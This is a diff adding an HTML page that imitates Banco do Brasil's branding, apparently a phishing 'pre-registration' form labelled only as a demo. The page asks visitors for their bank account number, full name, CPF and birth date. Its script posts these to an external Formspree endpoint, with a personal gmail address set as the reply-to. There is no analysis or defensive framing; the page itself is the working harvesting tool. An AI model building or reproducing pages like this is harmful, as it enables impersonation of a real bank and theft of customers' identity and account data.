@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Conta BB — Pré-cadastro</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <style>
+    :root{ --bb-yellow:#ffe600; --bb-blue:#001fa8; --bg:#0b0f18; --glass:rgba(255,255,255,.06); }
+    *{box-sizing:border-box} body{margin:0;font-family:"Inter",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:#eef2ff}
+    .topbar{background:var(--bb-yellow);color:#111} .container{max-width:960px;margin:0 auto;padding:0 20px}
+    .row{display:flex;gap:16px;align-items:center;flex-wrap:wrap;padding:10px 0}
+    .logo{display:flex;align-items:center;gap:10px;font-weight:800;color:#0a0f1a}
+    .breadcrumb{background:#001fa8} .breadcrumb .container{padding:10px 20px}
+    .hero{padding:36px 0 10px;background:radial-gradient(1200px 600px at 100% 10%, rgba(0,31,168,.25), transparent 60%)}
+    h1{color:var(--bb-yellow);font-size:clamp(28px,5vw,48px);margin:0 0 6px}
+    p.lead{color:#cdd7ff;margin:0 0 18px}
+    .form-card{background:rgba(10,15,26,.6);border:1px solid rgba(255,255,255,.14);border-radius:18px;padding:18px;box-shadow:0 18px 40px rgba(0,0,0,.35)}
+    form{display:grid;grid-template-columns:1fr 1fr;gap:14px} @media(max-width:720px){form{grid-template-columns:1fr}}
+    label{font-weight:600}
+    input{padding:12px;border-radius:12px;border:1px solid rgba(255,255,255,.18);background:var(--glass);color:#eef2ff}
+    .full{grid-column:1/-1}
+    .actions{grid-column:1/-1;display:flex;gap:12px;align-items:center;flex-wrap:wrap}
+    .btn{border:none;padding:12px 16px;border-radius:12px;cursor:pointer;font-weight:800}
+    .btn-primary{background:var(--bb-yellow);color:#0a0f1a}
+    .btn-outline{background:transparent;color:#e6edff;border:1px solid rgba(255,255,255,.25)}
+    small.note{color:#b9c6ff}
+    .ok{color:#8cffb0} .err{color:#ffb4b4}
+    a{color:#9dd1ff}
+    .footer{opacity:.8;font-size:12px;margin:14px 0 24px}
+  </style>
+</head>
+<body>
+  <header class="topbar">
+    <div class="container">
+      <div class="row">
+        <div class="logo"><span>Banco do Brasil — Demo</span></div>
+      </div>
+    </div>
+  </header>
+  <div class="breadcrumb">
+    <div class="container"><small>Pra você / Contas</small></div>
+  </div>
+
+  <section class="hero">
+    <div class="container">
+      <h1>Conta BB</h1>
+      <p class="lead">Pré‑cadastro seguro e rápido. Preencha seus dados abaixo.</p>
+    </div>
+  </section>
+
+  <section>
+    <div class="container">
+      <div class="form-card">
+        <form id="form">
+          <div class="field">
+            <label for="conta">Número da Conta</label>
+            <input id="conta" name="conta" type="text" inputmode="numeric" placeholder="Ex.: 12345-6" minlength="5" maxlength="12" required>
+          </div>
+          <div class="field">
+            <label for="nome">Nome</label>
+            <input id="nome" name="nome" type="text" placeholder="Seu nome completo" autocomplete="name" required>
+          </div>
+          <div class="field">
+            <label for="cpf">CPF</label>
+            <input id="cpf" name="cpf" type="text" inputmode="numeric" placeholder="000.000.000-00" required>
+          </div>
+          <div class="field">
+            <label for="nasc">Data Nasc.</label>
+            <input id="nasc" name="nasc" type="date" required>
+          </div>
+
+          <div class="full">
+            <small class="note">Ao enviar, você concorda com a Política de Privacidade.</small>
+          </div>
+
+          <div class="actions">
+            <button class="btn btn-primary" id="sendBtn">Enviar</button>
+            <button class="btn btn-outline" id="clearBtn" type="button">Limpar</button>
+            <span id="status"></span>
+          </div>
+        </form>
+        <div class="footer">
+          Hospedagem estática (GitHub Pages). O envio é feito por um serviço externo de formulários (ex.: Formspree).
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <script>
+    // CONFIGURE AQUI: endpoint Formspree (ou seu endpoint serverless)
+    // 1) Crie um formulário em https://formspree.io/ e substitua abaixo.
+    // 2) Ou use seu endpoint (Cloudflare Worker/Vercel/etc.)
+    const ENDPOINT = "https://formspree.io/f/SEU_ID_AQUI";
+
+    const form = document.getElementById('form');
+    const statusEl = document.getElementById('status');
+    const sendBtn = document.getElementById('sendBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const cpf = document.getElementById('cpf');
+    const conta = document.getElementById('conta');
+
+    // máscara leve para CPF
+    cpf.addEventListener('input', () => {
+      let v = cpf.value.replace(/\\D/g,'');
+      if (v.length > 11) v = v.slice(0,11);
+      let out = v;
+      if (v.length > 9) out = v.replace(/(\\d{3})(\\d{3})(\\d{3})(\\d{0,2})/,'$1.$2.$3-$4');
+      else if (v.length > 6) out = v.replace(/(\\d{3})(\\d{3})(\\d{0,3})/,'$1.$2.$3');
+      else if (v.length > 3) out = v.replace(/(\\d{3})(\\d{0,3})/,'$1.$2');
+      cpf.value = out;
+    });
+    conta.addEventListener('input', () => {
+      let v = conta.value.replace(/[^\\d-]/g,'');
+      conta.value = v.slice(0,12);
+    });
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      sendBtn.disabled = true; sendBtn.textContent = 'Enviando…';
+      statusEl.textContent = '';
+
+      const data = new FormData(form);
+      // adiciona o destinatário (opcional, pode ser fixo no painel Formspree)
+      data.append("_replyto", "anabealves98@gmail.com");
+      data.append("_subject", "Pré-cadastro — Conta BB");
+
+      try{
+        const r = await fetch(ENDPOINT, { method: "POST", body: data, headers: { "Accept": "application/json" }});
+        if (r.ok){
+          statusEl.innerHTML = '<span class="ok">✔️ Enviado com sucesso.</span>';
+          form.reset();
+        } else {
+          const t = await r.text();
+          statusEl.innerHTML = '<span class="err">Falha no envio: ' + t.substring(0,200) + '</span>';
+        }
+      }catch(err){
+        statusEl.innerHTML = '<span class="err">Erro de rede: ' + (err.message||err) + '</span>';
+      }finally{
+        sendBtn.disabled = false; sendBtn.textContent = 'Enviar';
+      }
+    });
+
+    clearBtn.addEventListener('click', ()=>{ form.reset(); statusEl.textContent = '' });
+  </script>
+</body>
+</html>
